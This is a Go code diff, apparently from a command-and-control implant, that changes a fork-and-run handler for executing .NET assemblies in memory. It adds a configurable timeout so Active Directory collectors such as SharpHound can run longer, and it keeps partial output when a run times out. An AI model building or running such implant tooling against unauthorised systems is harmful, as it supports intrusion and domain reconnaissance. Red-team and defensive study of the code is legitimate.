@@ -27,7 +27,7 @@ import (
 const clrChildEnvKey = "__ENDGAME_CLR_CHILD"
 
 // forkRunAssembly is the fork-and-run entry point called by the DOTNET_EXEC handler.
-func forkRunAssembly(asmBytes []byte, args string) (string, error) {
+func forkRunAssembly(asmBytes []byte, args string, timeoutSec int) (string, error) {
 	exePath, err := os.Executable()
 	if err != nil {
 		return ExecuteAssembly(asmBytes, args, "", "")
@@ -118,13 +118,22 @@ func forkRunAssembly(asmBytes []byte, args string) (string, error) {
 		outCh <- sb.String()
 	}()
 
+	// Most .NET utilities should finish quickly, but directory-wide AD
+	// collectors such as SharpHound can legitimately take several minutes.
+	// Keep the historical 60s default and allow the caller to opt into a
+	// bounded longer window for an explicitly long-running collection.
+	timeout := 60 * time.Second
+	if timeoutSec >= 60 && timeoutSec <= 1800 {
+		timeout = time.Duration(timeoutSec) * time.Second
+	}
+
 	var result string
 	select {
 	case result = <-outCh:
-	case <-time.After(60 * time.Second):
+	case <-time.After(timeout):
 		windows.TerminateProcess(pi.Process, 1) //nolint:errcheck
-		result = "[!] fork-and-run timeout (60s)\n"
-		<-outCh // drain reader goroutine
+		partial := <-outCh // collect output already written before termination
+		result = partial + fmt.Sprintf("\n[!] fork-and-run timeout (%s)", timeout)
 	}
 
 	windows.WaitForSingleObject(pi.Process, 5000) //nolint:errcheck
